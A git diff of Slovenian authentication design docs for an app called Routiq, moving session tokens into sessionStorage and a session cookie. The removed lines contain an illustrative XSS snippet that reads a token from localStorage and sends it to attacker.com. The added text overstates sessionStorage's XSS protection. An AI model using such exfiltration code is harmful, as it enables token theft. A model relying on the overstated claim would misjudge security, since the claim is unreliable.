@@ -54,48 +54,32 @@ sequenceDiagram
 
 ---
 
-## 2. Shranjevanje tokenov
+## 2. Shranjevanje tokenov in varnost sej (Session Management)
+
+Routiq uporablja hibridni pristop za shranjevanje sej, ki zagotavlja visoko varnost pred napadi XSS (Cross-Site Scripting) in hkrati preprečuje napade CSRF (Cross-Site Request Forgery).
 
 ```mermaid
-graph LR
-    Login["Login\nGoogle OAuth"] --> AT["access_token\n(15 min)"]
-    Login --> RT["refresh_token\n(7 dni)"]
-
-    AT -->|"shranjeno v"| CTX["React Context\n(memory / RAM)"]
-    RT -->|"Supabase SDK"| SDK["httpOnly-style storage\n(ni dostopno JS kodi)"]
-
-    CTX -->|"vsak API request"| AUTH["Authorization: Bearer ..."]
-    SDK -->|"samodejno ob 401"| REFRESH["Supabase.refreshSession()"]
+graph TD
+    Login["Prijava (E-pošta / Google)"] --> SB["Supabase Auth"]
+    SB -->|"Shranjevanje seje"| SS["sessionStorage\n(Izbris ob zaprtju zavihka)"]
+    SB -->|"onAuthStateChange"| Cookie["sb-access-token Cookie\n(SameSite=Lax, Secure, Session)"]
+    
+    SS -->|"Vsak API request (axios)"| AuthHeader["Authorization: Bearer <token>"]
+    Cookie -->|"File Downloads / GET"| CookieAuth["Preverjanje piškotka (samo GET/HEAD)"]
 ```
 
-### Zakaj NE `localStorage`?
+### Hramba sej na klientski strani (`sessionStorage`)
 
-`localStorage` je dostopen kateremu koli JavaScript skriptu v isti domeni. XSS napad (injicirana JS koda) bi zlahka ukradel token:
+Namesto privzetega shranjevanja v `localStorage` (ki ostane trajno zapisan na disku brskalnika in je izpostavljen XSS kraji), Routiq konfigurira Supabase klijenta z uporabo **`sessionStorage`**:
+* **Naravni življenjski cikel**: Podatki o seji se samodejno izbrišejo iz brskalnika takoj, ko uporabnik zapre zavihek ali okno brskalnika.
+* **XSS zaščita**: Sejni žetoni niso trajno shranjeni v brskalniku, kar znatno zmanjša časovno okno za zlorabo žetonov v primeru napada XSS.
 
-```javascript
-// Napadalec s XSS dostopom
-const stolen = localStorage.getItem('access_token')
-fetch('https://attacker.com/steal?token=' + stolen)
-```
+### Sinhronizacija s sejnimi piškotki (`sb-access-token`)
 
-### Zakaj memory (React Context)?
-
-Token v RAM-u ni dostopen zunanjemu JS. Edina slabost: token se izgubi ob osvežitvi strani — to Supabase SDK avtomatsko reši z `refreshSession()` ob inicializaciji.
-
-```typescript
-// AuthContext.tsx — primer
-const [user, setUser] = useState<User | null>(null)
-const accessTokenRef = useRef<string | null>(null) // NE useState — ne renderira
-
-useEffect(() => {
-  supabase.auth.onAuthStateChange((event, session) => {
-    if (session) {
-      accessTokenRef.current = session.access_token
-      setUser(session.user)
-    }
-  })
-}, [])
-```
+Za primere klientskih zahtev, kjer ni mogoče ročno nastaviti `Authorization` záhlavja (npr. neposredni prenos datotek preko brskalnika, kot je izvoz koledarja `.ics` preko `GET` zahtevkov), frontend sinhronizira žeton v piškotek:
+* **Sejni piškotek**: Piškotek `sb-access-token` nima določenega atributa `Max-Age` ali `Expires`, kar pomeni, da ga brskalnik obravnava kot sejni piškotek in ga uniči takoj ob zaprtju brskalnika.
+* **Varnostne nastavitve**: Nastavljen je z atributi `SameSite=Lax` in `Secure` za preprečevanje zlorabe v nezavarovanih povezavah.
+* **Brisanje ob odjavi**: Ob odjavi (`SIGNED_OUT` dogodek in ročni izhod) se piškotek eksplicitno izbriše s pretečenim datumom (`expires=Thu, 01 Jan 1970 00:00:00 GMT`).
 
 ---
 
@@ -104,10 +88,12 @@ useEffect(() => {
 ### JwtAuthGuard (globalen)
 
 Vsak request gre skozi `JwtAuthGuard` ki:
-1. Izvleče Bearer token iz `Authorization` headerja
-2. Pokliče `supabase.auth.getUser(token)` za verifikacijo
-3. Pokliče `upsertUser()` za sinhronizacijo lokalnih podatkov
-4. Priloži `user` objekt na `request` objekt
+1. Izvleče Bearer token iz `Authorization` headerja (primarni vir).
+2. Če Bearer token ni prisoten, poskusi izvleči token iz piškotka `sb-access-token` (fallback).
+   * **CSRF zaščita (Harden)**: Zaščita pred CSRF napadi je implementirana tako, da se token iz piškotka prebere **samo za varne HTTP metode (`GET`, `HEAD`, `OPTIONS`)**. Za vse mutacijske zahteve (POST, PUT, DELETE, PATCH) je obvezno `Authorization: Bearer` záhlavje, s čimer popolnoma preprečimo CSRF napade.
+3. Pokliče `supabase.auth.getUser(token)` za verifikacijo.
+4. Pokliče `upsertUser()` za sinhronizacijo lokalnih podatkov.
+5. Priloži `user` objekt na `request` objekt.
 
 ```typescript
 // Endpoints ki ne zahtevajo auth:
